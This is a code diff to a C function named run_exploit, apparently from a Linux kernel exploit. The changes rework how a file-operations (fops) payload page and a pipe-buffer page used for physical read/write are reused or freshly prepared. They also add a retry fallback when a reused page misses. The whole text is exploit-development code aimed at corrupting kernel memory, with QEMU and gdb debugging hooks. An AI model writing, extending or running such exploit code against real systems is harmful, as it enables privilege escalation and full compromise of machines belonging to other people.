@@ -459,6 +459,17 @@ int run_exploit(int argc, char **argv) {
   }
 #endif
 
+  int reuse_fops_page = 0;
+#if defined(APP_FOPS_REUSE_VERIFIED_PAGE) && \
+    APP_FOPS_REUSE_VERIFIED_PAGE
+#if defined(APP_FOPS_REWRITE_RECLAIMED_PAGE) && \
+    APP_FOPS_REWRITE_RECLAIMED_PAGE
+  reuse_fops_page = app_fops_reused_page_ready;
+#else
+  reuse_fops_page = 1;
+#endif
+#endif
+
 #if defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && \
     APP_FOPS_DATA_ALIAS_DIAG_ONLY
   if (!verify_fops_data_alias_before_production()) {
@@ -468,38 +479,36 @@ int run_exploit(int argc, char **argv) {
 #endif
 
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-#if defined(APP_FOPS_REUSE_VERIFIED_PAGE) && \
-    APP_FOPS_REUSE_VERIFIED_PAGE
-  pr_info("reusing verified fops payload page=%016zx pipe_page=%016zx\n",
-          page_base, pipebuf_page_base);
-  if (!is_direct_ptr(page_base) || !is_direct_ptr(pipebuf_page_base)) {
-    return 1;
-  }
-#else
-  reset_pipe_attempt();
+  if (reuse_fops_page) {
+    pr_info("reusing verified fops payload page=%016zx pipe_page=%016zx\n",
+            page_base, pipebuf_page_base);
+    if (!is_direct_ptr(page_base) || !is_direct_ptr(pipebuf_page_base)) {
+      return 1;
+    }
+  } else {
+    reset_pipe_attempt();
 #if defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY
-  if (!prepare_p0_pipe_oracle()) {
-    pr_error("fops oracle pipe preparation failed\n");
-    return 1;
-  }
-  pr_info("fresh fops oracle pipe page=%016zx\n", pipebuf_page_base);
+    if (!prepare_p0_pipe_oracle()) {
+      pr_error("fops oracle pipe preparation failed\n");
+      return 1;
+    }
+    pr_info("fresh fops oracle pipe page=%016zx\n", pipebuf_page_base);
 #else
 #if !defined(APP_FOPS_BEFORE_PIPE) || !APP_FOPS_BEFORE_PIPE
-  pipebuf_page_base = prepare_pipe_buffer_page();
-  pr_info("fresh physrw pipe page=%016zx\n", pipebuf_page_base);
-  if (!is_direct_ptr(pipebuf_page_base)) {
-    return 1;
+    pipebuf_page_base = prepare_pipe_buffer_page();
+    pr_info("fresh physrw pipe page=%016zx\n", pipebuf_page_base);
+    if (!is_direct_ptr(pipebuf_page_base)) {
+      return 1;
+    }
+#endif
+#endif
   }
-#endif
-#endif
-#endif
 #endif
 
   pin_to_core(CORE);
-#if !defined(APP_FOPS_REUSE_VERIFIED_PAGE) || \
-    !APP_FOPS_REUSE_VERIFIED_PAGE
-  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
-#endif
+  if (!reuse_fops_page) {
+    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+  }
 
 #ifdef QEMU_FOPS_GDB_HOLD_SECONDS
   pr_info("qemu fops gdb hold seconds=%d base=%016zx\n",
@@ -550,18 +559,29 @@ int run_exploit(int argc, char **argv) {
 #else
   durable_log_checkpoint("fops-page-held");
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
-#if defined(APP_FOPS_REUSE_VERIFIED_PAGE) && \
-    APP_FOPS_REUSE_VERIFIED_PAGE
-  const int fops_fresh_page_attempts = 1;
-#else
+  int fops_fresh_page_attempts = 1;
 #ifdef APP_FOPS_FRESH_PAGE_ATTEMPTS
-  const int fops_fresh_page_attempts = APP_FOPS_FRESH_PAGE_ATTEMPTS;
+#if defined(APP_FOPS_REWRITE_RECLAIMED_PAGE) && \
+    APP_FOPS_REWRITE_RECLAIMED_PAGE
+  fops_fresh_page_attempts = APP_FOPS_FRESH_PAGE_ATTEMPTS;
 #else
-  const int fops_fresh_page_attempts = 1;
+  if (!reuse_fops_page) {
+    fops_fresh_page_attempts = APP_FOPS_FRESH_PAGE_ATTEMPTS;
+  }
 #endif
 #endif
   for (int attempt = 1; attempt <= fops_fresh_page_attempts; attempt++) {
     if (attempt != 1) {
+#if defined(APP_FOPS_REWRITE_RECLAIMED_PAGE) && \
+    APP_FOPS_REWRITE_RECLAIMED_PAGE
+      if (reuse_fops_page) {
+        pr_info("app fops reused-page clean miss; resetting parent state "
+                "before fresh fallback\n");
+        app_fops_reused_page_ready = 0;
+        reuse_fops_page = 0;
+        reset_pipe_attempt();
+      }
+#endif
       page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
       if (!page_base) {
         pr_warning("app fops fresh page unavailable attempt=%d/%d\n",
